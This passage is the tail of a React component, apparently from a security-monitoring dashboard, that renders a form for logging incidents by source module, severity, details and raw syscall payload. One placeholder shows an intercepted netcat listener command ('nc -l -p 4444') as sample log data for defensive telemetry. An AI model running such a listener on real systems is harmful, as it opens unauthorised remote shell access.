                    className="w-full bg-black border border-white/5 focus:border-[#00f0ff]/50 focus:outline-none rounded px-3 py-2 text-zinc-200"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3.5">
                  {/* Category */}
                  <div className="space-y-1">
                    <label className="text-[8.5px] text-zinc-500 uppercase tracking-wider font-bold">Log Source Module</label>
                    <select
                      value={newCategory}
                      onChange={(e) => setNewCategory(e.target.value as 'ebpf' | 'ast')}
                      className="w-full bg-black border border-white/5 focus:border-[#00f0ff]/50 focus:outline-none rounded px-2.5 py-1.5 text-zinc-200 cursor-pointer"
                    >
                      <option value="ebpf">eBPF Kernel Telemetry</option>
                      <option value="ast">Heuristic AST Static Scan</option>
                    </select>
                  </div>

                  {/* Severity */}
                  <div className="space-y-1">
                    <label className="text-[8.5px] text-zinc-500 uppercase tracking-wider font-bold">Classification Severity</label>
                    <select
                      value={newSeverity}
                      onChange={(e) => setNewSeverity(e.target.value as 'low' | 'medium' | 'high')}
                      className="w-full bg-black border border-white/5 focus:border-[#00f0ff]/50 focus:outline-none rounded px-2.5 py-1.5 text-zinc-200 cursor-pointer"
                    >
                      <option value="high">Critical / High</option>
                      <option value="medium">Medium Warning</option>
                      <option value="low">Low Recon Audit</option>
                    </select>
                  </div>
                </div>

                {/* Details */}
                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-500 uppercase tracking-wider font-bold">Heuristic Incident Details</label>
                  <textarea
                    required
                    placeholder="Provide a comprehensive operational analysis narrative showing what was triggered or intercepted."
                    value={newDetails}
                    onChange={(e) => setNewDetails(e.target.value)}
                    className="w-full bg-black border border-white/5 focus:border-[#00f0ff]/50 focus:outline-none rounded p-2.5 text-zinc-200 min-h-[50px] leading-normal"
                  />
                </div>

                {/* Raw execution payload */}
                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-500 uppercase tracking-wider font-bold">Unsanitized Raw Code / Syscall Arguments</label>
                  <textarea
                    placeholder="e.g. syscall=execve comm=nc pid=1409 args='-l -p 4444' status=intercepted"
                    value={newRawPayload}
                    onChange={(e) => setNewRawPayload(e.target.value)}
                    className="w-full bg-black border border-white/5 focus:border-[#00f0ff]/50 focus:outline-none rounded p-2.5 text-[#F43F5E] min-h-[50px] font-mono leading-normal"
                  />
                </div>

                {/* Submission button */}
                <div className="flex gap-2.5 justify-end pt-3 text-right">
                  <button
                    type="button"
                    onClick={() => setIsAddingNew(false)}
                    className="px-4 py-2 rounded bg-white/5 border border-white/5 hover:bg-white/10 text-white/70 tracking-wider uppercase font-bold text-[9px] cursor-pointer font-mono"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 rounded bg-[#00f0ff]/20 border border-[#00f0ff]/45 text-[#00f0ff] hover:bg-[#00f0ff] hover:text-black tracking-wider uppercase font-bold text-[9px] cursor-pointer font-mono transition-all"
                  >
                    Register Historical Log
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
